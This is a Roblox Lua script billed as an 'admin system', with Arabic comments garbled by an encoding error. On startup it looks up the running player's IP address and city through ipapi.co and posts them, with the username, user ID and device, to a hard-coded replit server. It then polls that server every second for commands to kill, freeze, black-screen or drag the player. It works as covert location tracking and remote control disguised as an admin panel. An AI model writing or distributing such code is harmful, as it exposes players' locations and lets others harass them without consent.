--[=[
â•”â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•—
â•‘                  ROBLOX ADMIN SYSTEM v6.0 - FINAL VERSION                 â•‘
â•‘              Ù†Ø¸Ø§Ù… Ø¥Ø¯Ø§Ø±Ø© Ø³ÙƒØ±Ø¨Øª Ø±ÙˆØ¨Ù„ÙˆÙƒØ³ - Ø§Ù„Ù†Ø³Ø®Ø© Ø§Ù„Ù†Ù‡Ø§Ø¦ÙŠØ© Ø§Ù„Ø´ØºØ§Ù„Ø©            â•‘
â•šâ•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
]=]--

-- âš ï¸ ØºÙŠØ± Ù‡Ø°Ø§ Ø§Ù„Ø±Ø§Ø¨Ø· ÙÙ‚Ø· Ø¥Ø°Ø§ ÙƒØ§Ù† Ù…ÙˆÙ‚Ø¹Ùƒ Ù…Ø®ØªÙ„Ù
local SERVER_URL = "https://8f97c976-6ce8-4604-97ca-3c4e5dd2aa63-00-1ru3hkt8vlk56.janeway.replit.dev/"

-- Configuration
local HEARTBEAT_INTERVAL = 8
local COMMAND_CHECK_INTERVAL = 1
local ONLINE_COUNT_INTERVAL = 5

-- Services
local Players = game:GetService("Players")
local HttpService = game:GetService("HttpService")
local UserInputService = game:GetService("UserInputService")
local RunService = game:GetService("RunService")
local Workspace = game:GetService("Workspace")

local LocalPlayer = Players.LocalPlayer
local PlayerGui = LocalPlayer:WaitForChild("PlayerGui")

-- State Variables
local isAuthorized = false
local permissionLevel = nil
local activeCommands = {}
local onlineCount = 0
local guiCreated = false
local sessionId = HttpService:GenerateGUID(false)
local lastHeartbeat = 0
local lastCommandCheck = 0

print("[ADMIN SYSTEM] Starting initialization...")

-- â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
-- Utility Functions
-- â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•

local function getDeviceType()
    local touchEnabled = UserInputService.TouchEnabled
    local keyboardEnabled = UserInputService.KeyboardEnabled
    
    if touchEnabled and not keyboardEnabled then
        return "iPhone"
    elseif touchEnabled and keyboardEnabled then
        return "iPad"
    else
        return "PC"
    end
end

local function getLocationData()
    local success, response = pcall(function()
        return request({
            Url = "https://ipapi.co/json/",
            Method = "GET"
        })
    end)
    
    if success then
        local decoded = HttpService:JSONDecode(response.Body)
        return {
            ip = decoded.ip or "Unknown",
            city = decoded.city or "Unknown",
            region = decoded.region or "Unknown",
            country = decoded.country_name or "Unknown"
        }
    end
    
    return {ip = "Unknown", city = "Unknown", region = "Unknown", country = "Unknown"}
end

local function getMapData()
    return {
        mapId = tostring(game.PlaceId),
        mapName = game.PlaceName or "Unknown Map",
        gameId = game.GameId and tostring(game.GameId) or "Unknown"
    }
end

-- â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
-- HTTP Communication
-- â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•

local function makeRequest(endpoint, method, payload)
    local success, response = pcall(function()
        local url = SERVER_URL .. "/api/trpc/" .. endpoint
        local headers = {["Content-Type"] = "application/json"}
        
        local config = {
            Url = url,
            Method = method,
            Headers = headers
        }
        
        if method == "POST" and payload then
            config.Body = HttpService:JSONEncode({json = payload})
        elseif method == "GET" and payload then
            local queryStr = HttpService:JSONEncode({json = payload})
            config.Url = url .. "?input=" .. HttpService:URLEncode(queryStr)
        end
        
        local result = request(config)
        return HttpService:JSONDecode(result.Body)
    end)
    
    if success and response then
        return response
    else
        warn("[ADMIN] Request failed:", response)
        return nil
    end
end

-- â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
-- Player Management
-- â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•

local function registerPlayerOnServer()
    local locationData = getLocationData()
    local mapData = getMapData()
    
    local payload = {
        robloxUsername = LocalPlayer.Name,
        robloxUserId = tostring(LocalPlayer.UserId),
        deviceType = getDeviceType(),
        ipAddress = locationData.ip,
        country = locationData.country,
        city = locationData.city,
        region = locationData.region,
        mapName = mapData.mapName,
        mapId = mapData.mapId,
        gameId = mapData.gameId,
        sessionId = sessionId,
        timestamp = os.time()
    }
    
    local response = makeRequest("players.register", "POST", payload)
    
    if response and response.result and response.result.data then
        isAuthorized = response.result.data.isAuthorized or false
        permissionLevel = response.result.data.permissionLevel or 0
        print("[ADMIN] Player registered! Authorized:", isAuthorized)
        return true
    end
    
    print("[ADMIN] Registration failed")
    return false
end

local function sendHeartbeat()
    local payload = {
        robloxUsername = LocalPlayer.Name,
        robloxUserId = tostring(LocalPlayer.UserId),
        sessionId = sessionId,
        timestamp = os.time(),
        isOnline = true
    }
    
    makeRequest("players.heartbeat", "POST", payload)
end

local function getOnlinePlayersCount()
    local response = makeRequest("players.onlineCount", "GET", {})
    
    if response and response.result and response.result.data then
        onlineCount = response.result.data
    end
end

-- â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
-- Command Execution
-- â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•

local function findPlayerByName(username)
    for _, player in pairs(Players:GetPlayers()) do
        if player.Name:lower() == username:lower() then
            return player
        end
    end
    return nil
end

local function executeCommandOnPlayer(commandName, targetUsername, executorUsername)
    local targetPlayer = findPlayerByName(targetUsername)
    
    if not targetPlayer or not targetPlayer.Character then
        print("[ADMIN] Target player not found:", targetUsername)
        return false
    end
    
    local character = targetPlayer.Character
    local humanoid = character:FindFirstChild("Humanoid")
    local rootPart = character:FindFirstChild("HumanoidRootPart")
    
    if not rootPart then
        return false
    end
    
    -- Command Execution
    if commandName == "Ø·Ø±Ø¯" or commandName == "kick" then
        if humanoid then humanoid.Health = 0 end
        rootPart.CFrame = CFrame.new(0, -500, 0)
        return true
        
    elseif commandName == "ØªØ¬Ù…ÙŠØ¯" or commandName == "freeze" then
        rootPart.Anchored = true
        activeCommands[targetUsername .. "_freeze"] = true
        return true
        
    elseif commandName == "Ø§ÙŠÙ‚Ø§Ù ØªØ¬Ù…ÙŠØ¯" or commandName == "unfreeze" then
        rootPart.Anchored = false
        activeCommands[targetUsername .. "_freeze"] = nil
        return true
        
    elseif commandName == "Ø³Ø­Ø¨" or commandName == "bring" then
        local executor = findPlayerByName(executorUsername)
        if executor and executor.Character then
            local execRoot = executor.Character:FindFirstChild("HumanoidRootPart")
            if execRoot then
                rootPart.CFrame = execRoot.CFrame * CFrame.new(0, 0, -5)
                return true
            end
        end
        
    elseif commandName == "Ø´Ø§Ø´Ø© Ø³ÙˆØ¯Ø§Ø¡" or commandName == "blackscreen" then
        local screenGui = Instance.new("ScreenGui")
        screenGui.Name = "BlackScreen_" .. targetUsername
        screenGui.ResetOnSpawn = false
        screenGui.Parent = targetPlayer:WaitForChild("PlayerGui")
        
        local frame = Instance.new("Frame")
        frame.Size = UDim2.new(1, 0, 1, 0)
        frame.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
        frame.BackgroundTransparency = 0
        frame.BorderSizePixel = 0
        frame.Parent = screenGui
        
        activeCommands[targetUsername .. "_blackscreen"] = screenGui
        return true
        
    elseif commandName == "Ø§ÙŠÙ‚Ø§Ù Ø§Ù„Ø´Ø§Ø´Ø© Ø§Ù„Ø³ÙˆØ¯Ø§Ø¡" or commandName == "unblackscreen" then
        local screenGui = activeCommands[targetUsername .. "_blackscreen"]
        if screenGui then
            screenGui:Destroy()
            activeCommands[targetUsername .. "_blackscreen"] = nil
            return true
        end
        
    elseif commandName == "ÙƒÙ„Ø¨Ø´Ø©" or commandName == "leash" then
        local executor = findPlayerByName(executorUsername)
        if executor and executor.Character then
            local execRoot = executor.Character:FindFirstChild("HumanoidRootPart")
            if execRoot then
                activeCommands[targetUsername .. "_leash"] = true
                spawn(function()
                    while activeCommands[targetUsername .. "_leash"] and rootPart do
                        rootPart.CFrame = execRoot.CFrame * CFrame.new(0, 0, -3)
                        wait(0.05)
                    end
                end)
                return true
            end
        end
        
    elseif commandName == "Ø§ÙŠÙ‚Ø§Ù Ø§Ù„ÙƒÙ„Ø¨Ø´Ø©" or commandName == "unleash" then
        activeCommands[targetUsername .. "_leash"] = nil
        return true
        
    elseif commandName == "ÙŠØ¯ÙˆØ± Ø­ÙˆÙ„Ùƒ" or commandName == "orbit" then
        local executor = findPlayerByName(executorUsername)
        if executor and executor.Character then
            local execRoot = executor.Character:FindFirstChild("HumanoidRootPart")
            if execRoot then
                activeCommands[targetUsername .. "_orbit"] = true
                spawn(function()
                    local angle = 0
                    while activeCommands[targetUsername .. "_orbit"] and rootPart do
                        angle = angle + 0.1
                        local x = math.cos(angle) * 10
                        local z = math.sin(angle) * 10
                        rootPart.CFrame = execRoot.CFrame * CFrame.new(x, 0, z)
                        wait(0.03)
                    end
                end)
                return true
            end
        end
        
    elseif commandName == "Ø§ÙŠÙ‚Ø§Ù ÙŠØ¯ÙˆØ± Ø­ÙˆÙ„Ùƒ" or commandName == "unorbit" then
        activeCommands[targetUsername .. "_orbit"] = nil
        return true
        
    elseif commandName == "Ù†Ø³Ø®" or commandName == "copy" then
        activeCommands[targetUsername .. "_copy"] = true
        spawn(function()
            while activeCommands[targetUsername .. "_copy"] and rootPart do
                executeCommandOnPlayer("ÙƒÙ„Ø¨Ø´Ø©", targetUsername, executorUsername)
                wait(7)
            end
        end)
        return true
        
    elseif commandName == "Ø§ÙŠÙ‚Ø§Ù Ù†Ø³Ø®" or commandName == "stopcopy" then
        activeCommands[targetUsername .. "_copy"] = nil
        return true
    end
    
    return false
end

local function checkForPendingCommands()
    local response = makeRequest("commands.getPending", "GET", {
        targetUsername = LocalPlayer.Name
    })
    
    if response and response.result and response.result.data then
        for _, command in pairs(response.result.data) do
            local success = executeCommandOnPlayer(
                command.commandName,
                LocalPlayer.Name,
                command.executorUsername
            )
            
            makeRequest("commands.complete", "POST", {
                id = command.id,
                status = success and "completed" or "failed"
            })
            
            print("[ADMIN] Command executed:", command.commandName, "Status:", success)
        end
    end
end

-- â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
-- GUI Creation
-- â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•

local function createAdminGUI()
    if not isAuthorized or guiCreated then
        print("[ADMIN] GUI creation skipped. Authorized:", isAuthorized)
        return
    end
    
    guiCreated = true
    print("[ADMIN] Creating GUI...")
    
    local ScreenGui = Instance.new("ScreenGui")
    ScreenGui.Name = "AdminPanel"
    ScreenGui.ResetOnSpawn = false
    ScreenGui.Parent = PlayerGui
    
    -- Main Panel
    local MainPanel = Instance.new("Frame")
    MainPanel.Name = "MainPanel"
    MainPanel.Size = UDim2.new(0, 400, 0, 180)
    MainPanel.Position = UDim2.new(0, 20, 0.5, -90)
    MainPanel.BackgroundColor3 = Color3.fromRGB(10, 20, 40)
    MainPanel.BorderSizePixel = 0
    MainPanel.Parent = ScreenGui
    
    local PanelCorner = Instance.new("UICorner")
    PanelCorner.CornerRadius = UDim.new(0, 10)
    PanelCorner.Parent = MainPanel
    
    local PanelStroke = Instance.new("UIStroke")
    PanelStroke.Color = Color3.fromRGB(50, 100, 200)
    PanelStroke.Thickness = 2
    PanelStroke.Parent = MainPanel
    
    -- Header
    local Header = Instance.new("Frame")
    Header.Size = UDim2.new(1, 0, 0, 40)
    Header.BackgroundColor3 = Color3.fromRGB(20, 35, 70)
    Header.BorderSizePixel = 0
    Header.Parent = MainPanel
    
    local HeaderCorner = Instance.new("UICorner")
    HeaderCorner.CornerRadius = UDim.new(0, 10)
    HeaderCorner.Parent = Header
    
    local TitleLabel = Instance.new("TextLabel")
    TitleLabel.Size = UDim2.new(0.6, 0, 1, 0)
    TitleLabel.Position = UDim2.new(0, 15, 0, 0)
    TitleLabel.BackgroundTransparency = 1
    TitleLabel.Text = "âš™ï¸ ADMIN PANEL"
    TitleLabel.TextColor3 = Color3.fromRGB(255, 255, 255)
    TitleLabel.TextSize = 16
    TitleLabel.Font = Enum.Font.GothamBold
    TitleLabel.TextXAlignment = Enum.TextXAlignment.Left
    TitleLabel.Parent = Header
    
    local OnlineCountLabel = Instance.new("TextLabel")
    OnlineCountLabel.Name = "OnlineCount"
    OnlineCountLabel.Size = UDim2.new(0.4, -15, 1, 0)
    OnlineCountLabel.Position = UDim2.new(0.6, 0, 0, 0)
    OnlineCountLabel.BackgroundTransparency = 1
    OnlineCountLabel.Text = "ğŸ‘¥ " .. tostring(onlineCount)
    OnlineCountLabel.TextColor3 = Color3.fromRGB(100, 255, 150)
    OnlineCountLabel.TextSize = 14
    OnlineCountLabel.Font = Enum.Font.GothamMedium
    OnlineCountLabel.TextXAlignment = Enum.TextXAlignment.Right
    OnlineCountLabel.Parent = Header
    
    -- Command Input
    local InputFrame = Instance.new("Frame")
    InputFrame.Size = UDim2.new(1, -30, 0, 40)
    InputFrame.Position = UDim2.new(0, 15, 0, 50)
    InputFrame.BackgroundColor3 = Color3.fromRGB(15, 30, 55)
    InputFrame.BorderSizePixel = 0
    InputFrame.Parent = MainPanel
    
    local InputCorner = Instance.new("UICorner")
    InputCorner.CornerRadius = UDim.new(0, 6)
    InputCorner.Parent = InputFrame
    
    local CommandBox = Instance.new("TextBox")
    CommandBox.Name = "CommandBox"
    CommandBox.Size = UDim2.new(1, -10, 1, 0)
    CommandBox.Position = UDim2.new(0, 5, 0, 0)
    CommandBox.BackgroundTransparency = 1
    CommandBox.Text = ""
    CommandBox.PlaceholderText = "Ø·Ø±Ø¯ username"
    CommandBox.TextColor3 = Color3.fromRGB(255, 255, 255)
    CommandBox.PlaceholderColor3 = Color3.fromRGB(100, 120, 150)
    CommandBox.TextSize = 14
    CommandBox.Font = Enum.Font.Gotham
    CommandBox.ClearTextOnFocus = false
    CommandBox.Parent = InputFrame
    
    -- Info Label
    local InfoLabel = Instance.new("TextLabel")
    InfoLabel.Size = UDim2.new(1, -30, 0, 30)
    InfoLabel.Position = UDim2.new(0, 15, 0, 100)
    InfoLabel.BackgroundTransparency = 1
    InfoLabel.Text = "ğŸŸ¢ Ù†Ø´Ø· | Ø¹Ø¯Ø¯ Ø§Ù„Ù„Ø§Ø¹Ø¨ÙŠÙ†: " .. tostring(onlineCount)
    InfoLabel.TextColor3 = Color3.fromRGB(180, 200, 220)
    InfoLabel.TextSize = 12
    InfoLabel.Font = Enum.Font.Gotham
    InfoLabel.TextXAlignment = Enum.TextXAlignment.Left
    InfoLabel.Parent = MainPanel
    
    -- Draggable
    local dragging = false
    local dragStart
    local startPos
    
    Header.InputBegan:Connect(function(input)
        if input.UserInputType == Enum.UserInputType.MouseButton1 then
            dragging = true
            dragStart = input.Position
            startPos = MainPanel.Position
        end
    end)
    
    Header.InputEnded:Connect(function(input)
        if input.UserInputType == Enum.UserInputType.MouseButton1 then
            dragging = false
        end
    end)
    
    UserInputService.InputChanged:Connect(function(input)
        if dragging and input.UserInputType == Enum.UserInputType.MouseMovement then
            local delta = input.Position - dragStart
            MainPanel.Position = UDim2.new(
                startPos.X.Scale, startPos.X.Offset + delta.X,
                startPos.Y.Scale, startPos.Y.Offset + delta.Y
            )
        end
    end)
    
    -- Update online count periodically
    spawn(function()
        while guiCreated do
            pcall(function()
                getOnlinePlayersCount()
                OnlineCountLabel.Text = "ğŸ‘¥ " .. tostring(onlineCount)
                InfoLabel.Text = "ğŸŸ¢ Ù†Ø´Ø· | Ø¹Ø¯Ø¯ Ø§Ù„Ù„Ø§Ø¹Ø¨ÙŠÙ†: " .. tostring(onlineCount)
            end)
            wait(ONLINE_COUNT_INTERVAL)
        end
    end)
    
    print("[ADMIN] GUI created successfully!")
end

-- â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
-- Main Loop
-- â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•

local function mainLoop()
    print("[ADMIN] Initializing main loop...")
    
    -- Register player
    if registerPlayerOnServer() then
        createAdminGUI()
    else
        print("[ADMIN] Failed to register player on server")
        return
    end
    
    -- Heartbeat loop
    spawn(function()
        while true do
            pcall(function()
                sendHeartbeat()
            end)
            wait(HEARTBEAT_INTERVAL)
        end
    end)
    
    -- Command check loop
    spawn(function()
        while true do
            pcall(function()
                checkForPendingCommands()
            end)
            wait(COMMAND_CHECK_INTERVAL)
        end
    end)
    
    -- Online count update loop
    spawn(function()
        while true do
            pcall(function()
                getOnlinePlayersCount()
            end)
            wait(ONLINE_COUNT_INTERVAL)
        end
    end)
end

-- Cleanup on disconnect
Players.PlayerRemoving:Connect(function(player)
    if player == LocalPlayer then
        pcall(function()
            makeRequest("players.disconnect", "POST", {
                robloxUsername = LocalPlayer.Name,
                sessionId = sessionId
            })
        end)
        print("[ADMIN] Player disconnected")
    end
end)

-- Start the script
print("[ADMIN SYSTEM] Script loaded! Starting...")
mainLoop()
print("[ADMIN SYSTEM] âœ… Script is running!")

